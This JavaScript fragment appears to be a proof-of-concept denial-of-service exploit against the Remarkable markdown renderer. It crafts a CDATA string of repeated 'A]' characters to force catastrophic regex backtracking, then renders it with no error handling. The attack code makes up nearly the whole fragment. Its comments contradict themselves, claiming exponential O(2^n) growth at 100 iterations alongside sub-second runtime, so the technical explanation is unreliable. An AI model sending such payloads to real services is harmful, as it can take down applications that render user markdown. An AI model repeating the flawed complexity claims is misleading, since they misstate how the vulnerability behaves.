    // /<!\[CDATA\[(?:[^\]]+|\][^\]]|\]\][^>]|\]\])*\]\]>/
    // 
    // This pattern contains overlapping alternations inside a repeating group.
    // When the input contains multiple consecutive ']' characters, the engine
    // cannot deterministically decide which alternative to apply at each position.
    // As the input approaches the end without a valid closure, V8's regex engine
    // spawns exponential branches trying every possible partition of the ']'.

    // We construct a payload that maximizes ambiguity by alternating 'A]' characters.
    let maliciousPayload = '<![CDATA[';

    // ~100 iterations is sufficient to cross modern backtracking thresholds due 
    // to O(2^n) complexity growth, while keeping execution time in the sub-second 
    // range for safe research validation.
    const triggerLength = 100;
    for (let i = 0; i < triggerLength; i++) {
        maliciousPayload += 'A]';
    }

    // Intentionally malformed closure to prevent early success and force the engine 
    // to exhaust all backtracking paths before failing.
    maliciousPayload += ']>';

    console.log(`[+] Payload length: ${maliciousPayload.length} characters`);
    console.log('[*] Invoking remarkable.render()...');

    const md = new Remarkable({ html: true });

    // No exception handling. The stack trace, process termination, or 
    // backtracking limit error will propagate to visibly demonstrate the vulnerability.
    return md.render(maliciousPayload);
